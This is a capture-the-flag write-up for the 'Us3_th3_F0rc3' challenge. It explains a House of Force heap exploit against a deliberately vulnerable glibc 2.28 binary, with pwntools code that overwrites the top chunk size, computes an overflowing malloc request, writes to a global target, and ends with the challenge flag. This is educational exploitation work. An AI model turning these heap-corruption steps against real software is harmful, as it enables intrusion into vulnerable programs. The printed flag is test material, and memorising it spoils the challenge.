# Wolverine Security Conference/CTF - Us3_th3_F0rc3

Original challenge link: https://ctf.wolvseccon.org/challenges#Us3_th3_F0rc3-49

You can also download challenge file in my repo: [Us3_th3_F0rc3.tar.gz](Us3_th3_F0rc3.tar.gz)

Download the tar file, extract it and let's start!

# 1. Find bug

First, we will use `file` and `checksec` to check for basic information:

```bash
$ file force0
force0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc_2.28_no-tcache/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ad4116e8666c5ef497fcc3d643c84c7643651bda, with debug_info, not stripped

$ checksec force0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    b'./glibc_2.28_no-tcache/'
```

This is a 64-bit file without being stripped and all the defences are on except the PIE. Next, we will read the given source code to know how it works.

We can see there is a function called print_flag() and it will print the flag for us. In main, we can see at the end is the comparation:

```c
if (!strcmp(TARGET, "I DID!")) {
    print_flag();
}
```

And if we can change `TARGET`, we will get the flag. 

Overall, we can just malloc() and cannot free(). In the first option, it will read size from user input, then malloc with that size. 

Then it will read data from user with the usable size plus 8, which means we can overwrite the metadata of the next chunk --> **Heap Overflow**

Finally, as the title of chall hinted, we will use a technique called `House of Force` for this chall. That's all we can find, let's move on!

# 2. Brainstorming

As we know, we will use the technique called `House of Force`, which you can view on this original site [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c) or in my technique repo [here](#)

And this is the original `House of Force` so just view 2 sites above and you will know how to conduct this technique.

# 3. Exploit

First, the program print out the address of heap and `TARGET` so let's get them:

```python
heap = int(p.recvline()[:-1].split(b' @')[1], 16)
target = int(p.recvline()[:-1].split(b' @')[1], 16)
```

Next we will malloc a chunk first and overwrite the topchunk size into `0xffffffffffffffff`:

```python
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{0x10}'.encode())
payload = b'A'*0x18
payload += p64(0xffffffffffffffff)
p.sendlineafter(b'Data: ', payload)
```

And the topchunk size is changed:

![change-topchunk-size.png](images/change-topchunk-size.png)

Now, we will need to calculate the size to malloc. For this technique, we will abuse the **Integer overflow** of the topchunk so that when we malloc with the appropriate size, the topchunk will has the address same with address of `TARGET`. 

For an easy way to understand, I will demonstrate it below:

```python
>>> topchunk = 0x0000000000405030         # Without metadata
>>> TARGET = 0x0000000000404010           # We want topchunk + request_size = TARGET - 0x10
>>> hex(topchunk + 0xffffffffffffefd0)
'0x10000000000404000'                     # Include metadata of topchunk
```

So the size we want to malloc is `0xffffffffffffefd0`, and the result we have is `0x10000000000404000` (9 bytes in total with the most significant byte is `0x1`). But topchunk address is just 64-bit size so that most significant byte will be removed. 

That means after `malloc(0xffffffffffffefd0)`, the topchunk address will be `0x404000` (include metadata so the address to write is `0x404010`)

So with the heap address, we can calculate topchunk address. Hence, calculate the size we want to malloc:

```python
TARGET = TARGET | 0x10000000000000000        # We want integer overflow so 0x1 will be remove
# topchunk + request_size = TARGET - 0x10    # 
request_size = TARGET - 0x10 - topchunk      # 
```

So python script snippet is:

```python
topchunk = heap + 0x20 + 0x10
target = target | 0x10000000000000000
request_size = target - 0x10 - topchunk
print("Old topchunk (without metadata): " + hex(topchunk))
print("Size to malloc: " + hex(request_size))
print("New topchunk (with metadata): " + hex(topchunk + request_size))
```

And let's malloc it again with that size:

```python
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{request_size}'.encode())
p.sendlineafter(b'Data: ', b'B'*8)
```

Let's check in gdb. This is the topchunk before the malloc with large size:

![old-topchunk.png](images/old-topchunk.png)

Look at the size to malloc:

![malloc-big-size.png](images/malloc-big-size.png)

And we can get the 64-bit address for new topchunk (**Integer Overflow** so `0x1` is removed):

![new-topchunk.png](images/new-topchunk.png)

So let's make it malloc and check again:

![after-malloc.png](images/after-malloc.png)

So now new topchunk is at 0x404000. Let's malloc again and this chunk will be `TARGET` address:

![rax.png](images/rax.png)

This is the return pointer to chunk just after malloc. So we just simply put the string `I DID!\x00` to it and we got the flag:

```python
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{0x20}'.encode())
p.sendlineafter(b'Data: ', b'I DID!\x00')
```

Full code: [solve.py](solve.py)

# 4. Get flag

![get-flag.png](images/get-flag.png)

Flag is `wsc{S0_Y0U_L34Rn3d_tH3_F0RCE?}`